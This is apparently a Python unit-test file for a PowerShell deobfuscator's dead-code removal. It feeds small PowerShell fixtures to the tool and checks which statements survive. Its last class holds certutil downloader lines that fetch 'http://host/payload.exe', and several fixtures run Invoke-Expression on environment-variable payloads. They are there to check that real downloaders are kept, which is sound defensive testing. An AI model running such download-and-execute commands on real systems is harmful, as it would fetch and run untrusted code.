from __future__ import annotations

import unittest

from test.lib.scripts.ps1.deobfuscation import TestPs1

#: An acting statement that is never a removal candidate, so its survival says only that the pass
#: did not empty the script wholesale.
_ANCHOR = "Write-Host 'ANCHOR_SURVIVES'"


class TestPs1TheSuccessVariableObservesACallThatRan(TestPs1):
    """
    Every command that runs writes `$?`, so a call whose own output nobody reads is still observable
    to a later read of that variable. `Ps1CommandModel.reads_command_success` answers whether the
    script holds one, and the pass that removes an inert function together with its calls keeps the
    group whole where it does.
    """

    def test_a_call_removed_between_a_failure_and_a_read_of_the_success_variable_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            Write-Error 'e'
            K
            Write-Host $?
        """)

    def test_the_same_call_is_removed_where_nothing_reads_the_success_variable(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ }}
            Write-Error 'e'
            K
            {_ANCHOR}
        """, F"""
            Write-Error 'e'
            {_ANCHOR}
        """)


class TestPs1TheFunctionDriveObservesADefinition(TestPs1):
    """
    `$function:K` reads the function table through the variable namespace and reports the body bound
    to the name, so a script reading it sees a definition removed from under it.
    `Ps1CommandModel.function_drive_reads` collects that read and the inert-definition removal keeps
    the group whole where it names a defined function; the provider-path spelling reaches the same
    fact through `touches_identity_provider`, which opens the whole world rather than naming the one
    function.
    """

    def test_a_definition_a_function_drive_read_reports_on_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            Write-Host $function:K
        """)

    def test_a_definition_an_item_cmdlet_reports_on_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            Write-Host (Get-Item function:K)
        """)

    def test_a_function_drive_read_keeps_only_the_name_it_reports_on(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ }}
            K
            function Z {{ }}
            Z
            Write-Host $function:K
        """, F"""
            function K {{ }}
            K
            Write-Host $function:K
        """)


class TestPs1ACommandTableReaderObservesADefinitionItNames(TestPs1):
    """
    `Get-Command` writes a `CommandNotFoundException` to the error stream when a name it was given
    literally matches nothing, and writes nothing at all when a pattern matches nothing. Removing a
    definition a literal read names therefore adds an error record the input never wrote, and
    removing one only a pattern could have matched adds nothing.
    """

    @unittest.expectedFailure
    def test_a_definition_a_literal_read_names_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            $Null = (Get-Command K).Name
            {_ANCHOR}
        """)

    def test_a_definition_written_below_the_read_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            $Null = (Get-Command K).Name
            function K {{ }}
            K
            {_ANCHOR}
        """, F"""
            $Null = (Get-Command K).Name
            {_ANCHOR}
        """)

    def test_a_definition_only_a_pattern_could_match_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function vnMTH {{ }}
            vnMTH
            $Null = (Get-Command *vnMT*).Name
            {_ANCHOR}
        """, F"""
            $Null = (Get-Command *vnMT*).Name
            {_ANCHOR}
        """)


class TestPs1ACallAboveItsDefinitionNamesNoCommand(TestPs1):
    """
    A `function` statement binds its name when it runs, so a call written above it resolves against
    whatever stood there before — nothing, in a script that defines the name once. 5.1 answers such
    a call with a `CommandNotFoundException`, which fails without ending the script and leaves `$?`
    at false, so a later read of `$?` observes the failure. Removing the call lets that read report
    the success that stood before it.
    """

    def test_a_call_written_above_the_only_definition_of_its_name_is_kept(self):
        self._assertKept(F"""
            K
            function K {{ }}
            Write-Host $?
        """)

    def test_a_call_written_below_the_definition_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ }}
            K
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1AStoredBlockRendersTheStatementsInIt(TestPs1):
    """
    PowerShell renders a `ScriptBlock` as its own source text, so what a script prints when it writes
    one out is the statements standing in it. A call inside a stored block is therefore not only a
    call: deleting it changes what the block renders as.
    """

    @unittest.expectedFailure
    def test_a_call_inside_a_block_the_script_writes_out_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            $b = {{ K }}
            Write-Host $b
        """)

    def test_a_block_the_script_writes_out_keeps_a_statement_that_acts(self):
        self._assertKept(F"""
            $b = {{ {_ANCHOR} }}
            Write-Host $b
        """)


class TestPs1AWorkflowBindsTheNameAFunctionBinds(TestPs1):
    """
    `workflow K { }` and `configuration K { }` write the same table `function K { }` writes, so a
    script holding both binds the name twice and a call reaches the later binding. The call graph
    reads the keyword definition beside the `function`, so the acting keyword body keeps the call
    the inert `function` alone would have dropped.
    """

    def test_a_call_a_workflow_of_the_same_name_claims_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            workflow K {{ Write-Host 'P' }}
            K
        """)


class TestPs1AnAliasAttributeBindsASecondNameForTheFunction(TestPs1):
    """
    An `[Alias]` attribute on a function's `param` block binds a second command name for that
    function when the definition runs, with no aliasing cmdlet standing in the script. A call under
    that second name is a reference to the definition, so removing the definition leaves the call
    naming nothing.
    """

    def test_a_definition_called_under_its_attribute_alias_is_kept(self):
        self._assertKept(F"""
            function K {{ [Alias('q')] param() }}
            q
            {_ANCHOR}
        """)

    def test_the_attribute_suffixed_spelling_binds_the_name_too(self):
        self._assertKept(F"""
            function K {{ [AliasAttribute('q')] param() }}
            q
            {_ANCHOR}
        """)

    def test_a_definition_with_no_attribute_alias_is_removed_with_its_call(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param() }}
            K
            {_ANCHOR}
        """, _ANCHOR)

    def test_an_alias_on_a_parameter_names_the_parameter_not_the_command(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param([Alias('q')]$x) }}
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1AParameterDefaultIsConvertedUnderItsTypeConstraint(TestPs1):
    """
    Binding a parameter runs the conversion its type constraint names, so a default value that does
    not convert makes every call raise `ParameterBindingArgumentTransformationException` before the
    body runs. A body read as inert says nothing about that, because the fault is the binder's.
    """

    def test_a_call_whose_parameter_default_does_not_convert_is_kept(self):
        self._assertKept(F"""
            function K {{ param([int] $x = 'abc') }}
            K
            {_ANCHOR}
        """)

    def test_a_call_whose_parameter_default_converts_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param([int] $x = '42') }}
            K
            {_ANCHOR}
        """, _ANCHOR)

    def test_a_call_whose_parameter_carries_no_type_constraint_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param($x = 'abc') }}
            K
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1ADefinitionReachedUnderASpellingTheWalkDoesNotFileUnderIt(TestPs1):
    """
    A call keyed under one name can resolve onto a definition keyed under another: the implicit
    `Get-` retry reaches `Get-Language` from a bare `language`, and a built-in alias reaches
    `Measure-Object` from `measure`. The definition is live in both, and the call graph files each
    call under the spelling it was written with, so what keeps the definition is the collision row
    rather than the call sites.
    """

    def test_a_definition_the_implicit_get_retry_reaches_is_kept(self):
        self._assertKept(F"""
            function Get-Language {{ }}
            language
            {_ANCHOR}
        """)

    def test_a_definition_a_builtin_alias_reaches_is_kept(self):
        self._assertDeobfuscatesTo("""
            function Measure-Object { }
            Measure-Object
            1, 2, 3 | measure
        """, """
            function Measure-Object { }
            Measure-Object
            1, 2, 3 | Measure-Object
        """)


class TestPs1AnIdentityNamespaceAssignmentRebindsTheNameItSpells(TestPs1):
    """
    `${function:q} = { }` binds a command name without writing a `function` statement, so a call
    below it does not reach the `function` definition standing above. The assignment leaves the type
    world closed, since its body stands in the tree, and what keeps the pair is
    `refinery.lib.scripts.ps1.analysis.callgraph.binds_command_identity`.
    """

    def test_a_definition_an_identity_assignment_rebinds_is_kept(self):
        self._assertDeobfuscatesTo("""
            function q { }
            ${function:q} = { Write-Host 'P' }
            q
        """, """
            function q { }
            $function:q = { Write-Host 'P' }
            q
        """)

class TestPs1ADefinitionCodeTheWalkCannotReadMayReachIsKept(TestPs1):
    """
    A definition is removable only where this tree is the whole story about who reaches its name.
    Four things say it is not, and each keeps an inert definition that every other rule would drop:
    a leak whose payload the analysis cannot read, an opaque dispatch, an export, and a definition
    no visible call site reaches at all. Deleting any of them under one of these is what the pass
    refuses today.
    """

    def test_a_definition_no_visible_call_site_reaches_is_kept_beside_a_leak(self):
        self._assertKept("""
            function K { }
            Invoke-Expression $q
        """)

    def test_a_definition_and_its_call_are_kept_beside_a_leak(self):
        self._assertKept("""
            function K { }
            K
            Invoke-Expression $q
        """)

    def test_a_definition_shadowing_a_cmdlet_is_kept_beside_a_leak(self):
        self._assertKept("""
            function Get-Date { }
            Get-Date
            Invoke-Expression $q
        """)

    def test_a_definition_and_its_call_are_kept_beside_an_opaque_dispatch(self):
        self._assertKept("""
            function K { }
            K
            & $f
        """)

    def test_a_definition_and_its_call_are_kept_beside_an_export(self):
        self._assertKept("""
            function K { }
            K
            Export-ModuleMember -Function K
        """)

class TestPs1ALeakAboveADefinitionCanRebindTheNameItBinds(TestPs1):
    """
    Code the analysis cannot read may bind an alias for a name this script defines as a function,
    and an alias beats a function whichever of the two was bound first. A leak standing *above* the
    definition is therefore as much a reason to keep the pair as one standing between the definition
    and its call. All three orderings are written out because only the middle one is caught by asking
    what stands between.
    """

    def test_a_definition_and_its_call_below_a_leak_are_kept(self):
        self._assertKept("""
            Invoke-Expression $q
            function K { }
            K
        """)

    def test_a_definition_and_its_call_around_a_leak_are_kept(self):
        self._assertKept("""
            function K { }
            Invoke-Expression $q
            K
        """)

    def test_a_definition_and_its_call_above_a_leak_are_kept(self):
        self._assertKept("""
            function K { }
            K
            Invoke-Expression $q
        """)

class TestPs1ADefinitionMayShadowOneBoundWhereTheWalkCannotSee(TestPs1):
    """
    Removing a definition does not unbind its name. Where code the analysis cannot read has bound
    the same name first, the removal uncovers that binding, so the emitted script runs a body the
    input never reached — which is a different and larger thing than a call to a name nothing
    defines. Resolving the strings is what makes it reachable here rather than hypothetical.
    """

    @unittest.expectedFailure
    def test_a_definition_shadowing_one_an_inlined_string_bound_is_kept(self):
        self._assertKept("""
            $env:B = 'function K { Write-Host P }'
            Invoke-Expression $env:B
            function K { 42 }
            $x = K
            Write-Output $x
            $env:C = 'K'
            Invoke-Expression $env:C
        """)

class TestPs1ARaiseAbandonsTheStatementsBelowItInTheSameBlock(TestPs1):
    """
    A bareword carrying an assignment marker is the shape an obfuscator pads with, and 5.1 answers it
    with `CommandNotFoundException`. Dropping it rests on the claim that it raised — so a statement
    it would have skipped cannot be carried out of the block with it, and a call written above the
    `function` that defines its name raises before that definition has run.

    Both are written with a bare value rather than a call, because a call is not fault-free and the
    pass refuses to carry one whatever the world says: the defect is only reachable through the
    statements it does carry.
    """

    def test_a_value_below_a_dropped_noise_bareword_is_not_carried_out_of_the_try(self):
        self._assertKept("""
            function f { try { zzq0000=5; 'tail' } catch {} }
            Write-Host (f)
        """)

    def test_the_same_value_with_no_raise_above_it_is_carried(self):
        self._assertDeobfuscatesTo("""
            function f { try { 'tail' } catch {} }
            Write-Host (f)
        """, "Write-Host 'tail'")

    def test_a_noise_bareword_alone_in_the_try_dissolves_the_construct(self):
        self._assertDeobfuscatesTo("""
            try {
              zzq0000=5
            } catch {}
            'next'
        """, "'next'")

    def test_a_call_above_the_definition_of_its_name_is_not_folded_to_the_body(self):
        self._assertKept("""
            zzqfoo1
            function zzqfoo1 { 'boom' }
            zzqfoo1
        """)

    def test_a_call_below_the_definition_is_folded_to_the_body(self):
        self._assertDeobfuscatesTo("""
            function zzqfoo1 { 'boom' }
            zzqfoo1
        """, "'boom'")

    def test_a_call_reached_only_through_a_later_invocation_is_folded(self):
        self._assertDeobfuscatesTo("""
            function A { zzqfoo1 }
            function zzqfoo1 { 'boom' }
            A
        """, "'boom'")

class TestPs1TheHandlerAroundANoiseBarewordHasToMatchIt(TestPs1):
    """
    Dropping a noise bareword rests on its `CommandNotFoundException` landing in a handler that
    swallows it, so the construct needs a clause that takes every error. An empty body is not that
    answer: a clause whose type filter misses has an empty body and takes nothing, a `try` with no
    `catch` at all takes nothing either, and at script scope the error then ends the run. Even where
    a clause does match the run continues, which is what the class below asks about instead. A
    `trap` that resumes past the bareword is the reason the run survived it and is answered here.
    """

    def test_a_noise_bareword_under_a_catch_that_cannot_match_is_kept(self):
        self._assertKept(F"""
            try {{
              zzqq0 =5
            }} catch [System.IO.IOException] {{}}
            {_ANCHOR}
        """)

    def test_a_noise_bareword_under_a_try_with_no_catch_at_all_is_kept(self):
        self._assertKept(F"""
            try {{
              zzqq0 =5
            }} finally {{
              Write-Host 'FIN'
            }}
            {_ANCHOR}
        """)

    @unittest.expectedFailure
    def test_a_trap_that_resumes_past_a_noise_bareword_is_kept(self):
        self._assertKept(F"""
            trap {{ continue }}
            zzqq0 =5
            {_ANCHOR}
        """)

    def test_a_trap_whose_body_acts_is_kept(self):
        self._assertKept(F"""
            trap {{
              Write-Host 'TRAPPED'
              continue
            }}
            zzqq0 =5
            {_ANCHOR}
        """)

    def test_a_noise_bareword_under_a_catch_that_matches_everything_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1ANoiseBarewordIsKeptWhereTheRecordItLeavesIsRead(TestPs1):
    """
    A handler that matches keeps the run alive; it does not unwrite what the raise wrote. `$Error`
    grows an entry, `$?` goes false and `$StackTrace` is filled, so a script reading any of them
    reads a different answer once the statement is gone.

    A read the script hides in a payload has no variable node to be found by until the payload is
    inlined, and the drop is taken first — so the names are looked for in text as well, by the
    spelling that makes them a read rather than by the word. What that costs is stated here rather
    than left to be discovered: a script that only *prints* `'$Error.Count'` reads nothing and is
    kept anyway. What it does not reach is a payload nothing decodes, which is
    `TestPs1ANoiseBarewordIsDroppedAboveAPayloadTheWalkCannotRead` below.

    The `expectedFailure` row below is that defect, and scanning text is not what would fix it.
    The drop is decided in the `fold` group and `Invoke-Expression` is inlined in `finalize`, so the
    question is asked while the read is still a string held in a variable. A scan reaches the
    spellings that survive as one literal and misses every one cut between two of them; measured, a
    payload assembled from `'$Err' + 'or.Count'`, or through a variable an earlier pass has not yet
    folded away, comes out with `$Error` standing in the output beside the deleted statement that
    filled it. A `[char[]]` payload is not one of them: `read` pins the cast over a literal, so
    `-join` folds the whole name to a single string in the `fold` group where the scan reaches it.

    Deciding a removal on an absence — no read found — before the passes that make reads appear have
    finished is not this recognizer's mistake alone, and closing it here would fix one member of a
    family: `refinery.lib.scripts.ps1.deobfuscation.deadcode._is_injected_noise_bareword` says as
    much about `$Error` itself, naming `refinery.lib.scripts.ps1.deobfuscation.removal.Ps1RemovalPlan`
    as where the general answer belongs. Every other statement remover in the package asks its own
    absence question, and whether any of them is asked too early is unmeasured.

    A read spelled through the cmdlet that names the variable — `$v = Get-Variable Error` — is a
    read too: `reads_the_error_record` reads the name a command addresses as a string, so a spelling
    that stores the result first is a read all the same.
    """

    def test_a_noise_bareword_is_kept_where_the_script_reads_the_error_list(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_script_reads_the_success_variable(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host $?
        """)

    def test_a_noise_bareword_is_kept_where_the_stack_trace_is_read(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host $StackTrace
        """)

    def test_a_noise_bareword_is_kept_where_the_read_arrives_through_a_resolved_payload(self):
        self._assertDeobfuscatesTo("""
            $zzqc = '$Error.Count'
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression $zzqc
        """, """
            try {
              zzqq0 =5
            } catch {}
            $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_read_is_spelled_in_a_payload_nothing_resolves(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            & $env:ZZQCOMMAND '$Error.Count'
        """)

    @unittest.expectedFailure
    def test_a_noise_bareword_is_kept_where_the_read_is_spelled_across_two_strings(self):
        """
        The passes join the two strings and the expected output is the resolved read, so this is a
        payload the tool *does* decode — it is decoded after the drop rather than before it.
        """
        self._assertDeobfuscatesTo("""
            $zzqa = '$Err'
            $zzqb = 'or.Count'
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression ($zzqa + $zzqb)
        """, """
            try {
              zzqq0 =5
            } catch {}
            $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_read_is_built_out_of_characters(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            $zzqc = -join [char[]](36, 69, 114, 114, 111, 114, 46, 67, 111, 117, 110, 116)
            Invoke-Expression $zzqc
        """, """
            try {
              zzqq0 =5
            } catch {}
            $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_record_is_read_through_get_variable(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            $v = Get-Variable Error
            Write-Host $v.Value.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_record_is_read_through_the_variable_drive(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            $v = Get-Item Variable:Error
            Write-Host $v.Value.Count
        """)

    def test_a_noise_bareword_is_kept_where_that_same_read_is_resolved_to_the_variable(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host (Get-Variable Error).Value.Count
        """, """
            try {
              zzqq0 =5
            } catch {}
            Write-Host $Error.Count
        """)

    def test_a_noise_bareword_beside_a_message_that_only_prints_the_name_is_kept_as_well(self):
        self._assertKept(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            Write-Host '$Error.Count'
            {_ANCHOR}
        """)

    def test_a_noise_bareword_beside_a_message_that_says_the_word_without_the_sigil_is_removed(
        self
    ):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            Write-Host 'an error occurred'
            {_ANCHOR}
        """, F"""
            Write-Host 'an error occurred'
            {_ANCHOR}
        """)

    def test_a_noise_bareword_beside_a_longer_name_sharing_the_prefix_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            Write-Host '$ErrorActionPreference = Stop'
            {_ANCHOR}
        """, F"""
            Write-Host '$ErrorActionPreference = Stop'
            {_ANCHOR}
        """)


class TestPs1ANoiseBarewordIsAnsweredWhereItStands(TestPs1):
    """
    A `function` statement binds its name when it runs, so the same bareword answers differently
    above and below it: above, it names nothing and raises into the empty handler, and below, it
    calls the function with `=5` as an argument. The trust gate asks where the script rebinds a
    command name and not merely whether, so the two get the two answers.
    """

    def test_a_noise_bareword_above_a_definition_of_its_own_name_is_removed(self):
        self._assertDeobfuscatesTo("""
            try {
              zzq0000 =5
            } catch {}
            function zzq0000 {
              Write-Host 'DEFINED'
            }
            zzq0000 'used'
        """, """
            function zzq0000 {
              Write-Host 'DEFINED'
            }
            zzq0000 'used'
        """)

    def test_a_noise_bareword_below_the_definition_is_kept(self):
        self._assertKept("""
            function zzq0000 {
              Write-Host 'DEFINED'
            }
            zzq0000 'used'
            try {
              zzq0000 =5
            } catch {}
        """)


class TestPs1ANoiseBarewordIsDroppedAboveAPayloadTheWalkCannotRead(TestPs1):
    """
    A payload this cannot decode is not evidence that the statements above it do anything, so the
    guess is made over them and the leak below is not a reason to refuse. Refusing on its mere
    presence would veto every noise-bareword removal below one, and on the motivating sample every
    noise bareword stands above one.

    What it costs is unobservable only where the payload really is opaque. Measured on 5.1,
    `$Error.Clear(); try { zzqq0 =5 } catch {}; Write-Host $Error.Count` writes 1 where the same
    script without the construct writes 0, so a payload reading `$Error.Count` sees a different
    number than the input gave it. The rows here hand the payload to the host through a name this
    never learns, so no reading of the input decides what they run.

    Where the read *is* visible the removal has to refuse, which is
    `TestPs1ANoiseBarewordIsKeptWhereTheRecordItLeavesIsRead` above — and its two `expectedFailure`
    rows are the boundary this class does not own: a payload the passes decode into the output,
    whose spelling the scan misses because the sigil and the name never stand in one literal. Those
    are wrong answers rather than the half no gate can cover.
    """

    def test_a_noise_bareword_above_an_environment_payload_is_removed(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """, 'Invoke-Expression $env:ZZQPAYLOAD')

    def test_a_noise_bareword_above_a_dispatch_through_a_name_it_cannot_read_is_removed(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            & $env:ZZQCOMMAND 'arg'
        """, "& $env:ZZQCOMMAND 'arg'")

    def test_a_noise_bareword_above_a_visible_read_of_the_error_list_is_kept(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
            Write-Host $Error.Count
        """)


class TestPs1AProgramOnThePathIsSpelledLikeANoiseBareword(TestPs1):
    """
    `certutil` is in none of the tables the guess consults, so by name alone a downloader cannot be
    told from injected padding, and the `=` marker is the only thing that separates them. Both rows
    are the shape a downloader is written in, one of them carrying an argument that begins with `=`,
    and both have to survive.

    `test_deadcode.TestPs1NoiseBarewordSpellings` asks the same of a closed-world script, where the
    trust gate grants and the marker answers alone. These are the open-world counterpart, and the
    marker answers alone here too: the trust gate is asked at the position, and a bareword written
    above the leak is one it grants. Both rows here survive on their argument lists, so the row below
    carries the shape that has only the marker left between it and deletion.
    """

    def test_a_downloader_whose_arguments_carry_no_marker_is_kept_beside_a_leak(self):
        self._assertKept("""
            try {
              certutil -urlcache -f http://host/payload.exe out.exe
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """)

    def test_a_downloader_whose_marker_sits_in_a_real_argument_is_kept_beside_a_leak(self):
        self._assertKept("""
            try {
              certutil -urlcache -f =http://host/payload.exe
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """)

    def test_a_program_whose_whole_argument_list_is_the_marker_is_dropped_beside_a_leak(self):
        """
        The shape the marker alone decides, held at a name the host really has: one unquoted
        argument beginning with `=` and nothing else, which is what `_carries_assignment_marker`
        was written to accept and what no downloader is spelled as. `certutil` reached this way
        writes its usage to the host and raises nothing, so the drop is a real deletion of output
        and not a refusal of one — it is taken because the marker says padding, and this row is
        where that judgement is recorded rather than inferred from the rows above.
        """
        self._assertDeobfuscatesTo("""
            try {
              certutil =http://host/payload.exe
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """, 'Invoke-Expression $env:ZZQPAYLOAD')
